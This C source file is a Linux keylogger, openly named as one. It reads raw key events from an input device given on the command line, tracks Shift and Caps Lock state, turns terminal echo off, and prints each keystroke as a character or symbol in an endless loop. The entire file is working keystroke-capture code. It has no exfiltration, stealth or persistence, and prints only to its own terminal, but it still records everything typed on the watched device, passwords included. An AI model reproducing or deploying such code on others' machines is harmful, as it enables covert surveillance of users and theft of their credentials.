#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
#include<linux/input-event-codes.h>
#include<linux/kd.h>
#include<sys/ioctl.h>
#include<stdbool.h>

#include<termios.h>
#include<unistd.h>


#define MIN_KARG_COUNT 2
#define ERROR -1
#define CAPS_LOCK_FLAG_OFFSET 1

#define USER_KEY_PRESS 1
#define USER_KEY_RELEASE 0

void disable_echo(){
	struct termios t;
	tcgetattr(STDIN_FILENO,&t);
	t.c_lflag &= ~ECHO;
	tcsetattr(STDIN_FILENO,TCSANOW,&t);
}

void enable_echo(){
	struct termios t;
	tcgetattr(STDIN_FILENO,&t);
	t.c_lflag |= ECHO;
	tcsetattr(STDIN_FILENO,TCSANOW,&t);

}

int main(int argc, char *argv[]){
	
	if(argc != MIN_KARG_COUNT){
		printf("usage: %s <event-name>\n",argv[0]);
		exit(ERROR);
	}

	disable_echo();

	printf("\t\t\t\t__________________________________\n\n");
	printf("\t\t\t\tkeylogger active...\n");
	printf("\t\t\t\tlog: <event-name> : %s\n",argv[1]);
	
	//open the event file
	int fd;
	if((fd = open(argv[1],O_RDONLY)) == -1){
		perror("open");
		exit(ERROR);
	}
	printf("\t\t\t\tlog: active file descriptor: %d\n",fd);	
	
	//read the event file into a buffer
	struct input_event ie;
	
	/*
	 *	KDGKBLED is not giving proper flag states when used with /dev/tty3 or any vc
	 *
	 *
	//get caps lock flag state
	int vc;
	if( (vc = open("/dev/tty3",O_RDONLY)) == -1 ){
		perror("open");
		exit(-1);
	}
	else
		printf("\t\t\tlog: active file descriptor: %d\n",vc);
	*/
	bool MODE_UPPERCASE;
	char arg;

	//get CAPS_LOCK state
	if(ioctl(fd,EVIOCGLED(sizeof(arg)),&arg) == ERROR){
		perror("EVIOCGLED");
		close(fd);
		exit(-1);
	} else{
		MODE_UPPERCASE = (arg >> LED_CAPSL) & CAPS_LOCK_FLAG_OFFSET;
	}
	printf("\t\t\t\tlog: (flag)CAPS_LOCK_ENABLED:%d\n",MODE_UPPERCASE);
	printf("\t\t\t\t__________________________________\n\n");

	bool left_shift_down=false;
	bool right_shift_down=false;
	bool caps_lock_active=false;
	bool shift_down=false;
	while(1){

		int rd_bytes = read(fd,&ie,sizeof(ie));
		
		//detect left shift press
		if(ie.type==EV_KEY && ie.code==KEY_LEFTSHIFT){
			if(ie.value==USER_KEY_PRESS){
				left_shift_down=true;
				MODE_UPPERCASE=!MODE_UPPERCASE;
			}
			else if(ie.value==USER_KEY_RELEASE){
				left_shift_down=false;
				MODE_UPPERCASE=!MODE_UPPERCASE;
			}
		}

		//detect right shift press
		if(ie.type==EV_KEY && ie.code==KEY_RIGHTSHIFT){
			if(ie.value==USER_KEY_PRESS){
				right_shift_down=true;
				MODE_UPPERCASE=!MODE_UPPERCASE;
			}
			else if(ie.value==USER_KEY_RELEASE){
				right_shift_down=false;
				MODE_UPPERCASE=!MODE_UPPERCASE;
			}
		}

		if(left_shift_down || right_shift_down)
			shift_down=true;
		else
			shift_down=false;

		if(ie.value==USER_KEY_PRESS){
			
			//Numbers
			if(ie.code==KEY_1)
				printf(shift_down ? "!":"1");
			if(ie.code==KEY_2)
				printf(shift_down ? "@":"2");
			if(ie.code==KEY_3)	
				printf(shift_down ? "#":"3");
			if(ie.code==KEY_4)
				printf(shift_down ? "$":"4");
			if(ie.code==KEY_5)
				printf(shift_down ? "%%":"5");
			if(ie.code==KEY_6)
				printf(shift_down ? "^" : "6");
			if(ie.code==KEY_7)
				printf(shift_down ? "&" : "7");
			if(ie.code==KEY_8)
				printf(shift_down ? "*" : "8");
			if(ie.code==KEY_9)
				printf(shift_down ? "(" : "9");
			if(ie.code==KEY_0)
				printf(shift_down ? ")" : "0");
			if(ie.code==KEY_MINUS)
				printf(shift_down ? "_" : "-");
			if(ie.code==KEY_EQUAL)
				printf(shift_down ? "+" : "=");
		
			//Alphabets
			if(ie.code==KEY_Q)
				printf(MODE_UPPERCASE ? "Q":"q");
			if(ie.code==KEY_W)
				printf(MODE_UPPERCASE ? "W":"w");
			if(ie.code==KEY_E)
				printf(MODE_UPPERCASE ? "E":"e");
			if(ie.code==KEY_R)
				printf(MODE_UPPERCASE ? "R":"r");
			if(ie.code==KEY_T)
				printf(MODE_UPPERCASE ? "T":"t");
			if(ie.code==KEY_Y)
				printf(MODE_UPPERCASE ? "Y":"y");
			if(ie.code==KEY_U)
				printf(MODE_UPPERCASE ? "U":"u");
			if(ie.code==KEY_I)
				printf(MODE_UPPERCASE ? "I":"i");
			if(ie.code==KEY_O)
				printf(MODE_UPPERCASE ? "O":"o");
			if(ie.code==KEY_P)
				printf(MODE_UPPERCASE ? "P":"p");

			if(ie.code==KEY_A)
				printf(MODE_UPPERCASE ? "A":"a");
			if(ie.code==KEY_S)
				printf(MODE_UPPERCASE ? "S":"s");
			if(ie.code==KEY_D)
				printf(MODE_UPPERCASE ? "D":"d");
			if(ie.code==KEY_F)
				printf(MODE_UPPERCASE ? "F":"f");
			if(ie.code==KEY_G)
				printf(MODE_UPPERCASE ? "G":"g");
			if(ie.code==KEY_H)
				printf(MODE_UPPERCASE ? "H":"h");
			if(ie.code==KEY_J)
				printf(MODE_UPPERCASE ? "J":"j");
			if(ie.code==KEY_K)
				printf(MODE_UPPERCASE ? "K":"k");
			if(ie.code==KEY_L)
				printf(MODE_UPPERCASE ? "L":"l");

			if(ie.code==KEY_Z)
				printf(MODE_UPPERCASE ? "Z":"z");
			if(ie.code==KEY_X)
				printf(MODE_UPPERCASE ? "X":"x");
			if(ie.code==KEY_C)
				printf(MODE_UPPERCASE ? "C":"c");
			if(ie.code==KEY_V)
				printf(MODE_UPPERCASE ? "V":"v");
			if(ie.code==KEY_B)
				printf(MODE_UPPERCASE ? "B":"b");
			if(ie.code==KEY_N)
				printf(MODE_UPPERCASE ? "N":"n");
			if(ie.code==KEY_M)
				printf(MODE_UPPERCASE ? "M":"m");
			
			//Special Characters
			if(ie.code==KEY_LEFTBRACE)
				printf(shift_down ? "{":"[");
			if(ie.code==KEY_RIGHTBRACE)
				printf(shift_down ? "}":"]");
			if(ie.code==KEY_SEMICOLON)
				printf(shift_down ? ":":";");
			if(ie.code==KEY_APOSTROPHE)
				printf(shift_down ? "\"" : "'");
			if(ie.code==KEY_GRAVE)
				printf(shift_down ? "~" : "`");
			if(ie.code==KEY_BACKSLASH)
				printf(shift_down ? "|" : "\\");
			if(ie.code==KEY_COMMA)
				printf(shift_down ? "<" : ",");
			if(ie.code==KEY_DOT)
				printf(shift_down ? ">" : ".");
			if(ie.code==KEY_SLASH)
				printf(shift_down ? "?" : "/");

			// Control Keys
			if(ie.code==KEY_LEFTSHIFT || ie.code==KEY_RIGHTSHIFT)
				printf("⇧");
			if(ie.code==KEY_SPACE)
				printf(" ");
			if(ie.code==KEY_BACKSPACE)
				printf("⌫");
			if(ie.code==KEY_ENTER)
				printf("⏎");
			if(ie.code==KEY_LEFTALT || ie.code==KEY_RIGHTALT)
				printf("⎇");
			if(ie.code==KEY_LEFTCTRL || ie.code==KEY_RIGHTCTRL)
				printf("⎈");
			if(ie.code==KEY_TAB)
				printf("↹");

			//Numpad keys
			if(ie.code==KEY_KPASTERISK)
				printf("*");
			if(ie.code==KEY_KP7)
				printf("7");
			if(ie.code==KEY_KP8)
				printf("8");
			if(ie.code==KEY_KP9)
				printf("9");
			if(ie.code==KEY_KPMINUS)
				printf("-");
			if(ie.code==KEY_KP4)
				printf("4");
			if(ie.code==KEY_KP5)
				printf("5");
			if(ie.code==KEY_KP6)
				printf("6");
			if(ie.code==KEY_KPPLUS)
				printf("+");
			if(ie.code==KEY_KP1)
				printf("1");
			if(ie.code==KEY_KP2)
				printf("2");
			if(ie.code==KEY_KP3)
				printf("3");
			if(ie.code==KEY_KP0)
				printf("0");
			if(ie.code==KEY_KPDOT)
				printf(".");

			//arrow keys
			if(ie.code==KEY_UP)
				printf("↑");
			if(ie.code==KEY_LEFT)
				printf("←");
			if(ie.code==KEY_RIGHT)
				printf("→");
			if(ie.code==KEY_DOWN)
				printf("↓");

			if(ie.code==KEY_CAPSLOCK){
				MODE_UPPERCASE = !MODE_UPPERCASE;
				printf("⇪");
			}
		}

		fflush(stdout);
	}
	enable_echo();
	return 0;
}
